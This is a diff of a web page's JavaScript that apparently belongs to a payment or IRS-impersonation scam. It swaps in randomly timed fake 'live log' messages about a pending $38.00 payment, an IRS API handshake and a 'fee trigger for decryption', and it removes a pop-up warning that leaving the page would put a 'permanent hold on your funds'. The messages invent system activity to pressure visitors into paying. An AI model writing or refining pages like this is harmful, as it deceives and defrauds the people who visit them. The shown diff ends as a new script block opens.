-            "GATEWAY_STATUS: LISTENING ON PORT 8333..."
+        const events = [
+            "MONITORING_PAYMENT_CHANNEL: $38.00_PENDING...",
+            "ENCRYPTED_BLOB_SYNC: NODE_09_SUCCESS",
+            "VERIFYING_IRS_API_HANDSHAKE...",
+            "CLIENT_SM-F731U: SYSTEM_CLEAN",
+            "AWAITING_FEE_TRIGGER_FOR_DECRYPTION...",
+            "DOC_HASH: SHA256_VERIFIED_771x9",
+            "LISTENING_FOR_SIGNAL: 0x38_IRS_COLLATERAL"
         ];
 
         function addLiveLog() {
             const now = new Date();
-            const time = now.getHours().toString().padStart(2, '0') + ':' + 
-                         now.getMinutes().toString().padStart(2, '0') + ':' + 
-                         now.getSeconds().toString().padStart(2, '0');
-            const msg = eventPool[Math.floor(Math.random() * eventPool.length)];
+            const time = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
+            const msg = events[Math.floor(Math.random() * events.length)];
             const div = document.createElement('div');
             div.className = 'trail-line';
             div.innerHTML = `<span class="trail-timestamp">${time}</span> ${msg}`;
             logContainer.appendChild(div);
             logContainer.scrollTop = logContainer.scrollHeight;
-            setTimeout(addLiveLog, Math.random() * 5000 + 3000);
+            setTimeout(addLiveLog, Math.random() * 4000 + 2000);
         }
         addLiveLog();
-
-        // Redirect prevention
-        window.onbeforeunload = function() {
-            return "A settlement transaction is currently pending. Leaving this page may cause a permanent hold on your funds.";
-        };
     </script>
-
+    
 <script>
   (function() {
     "use strict";
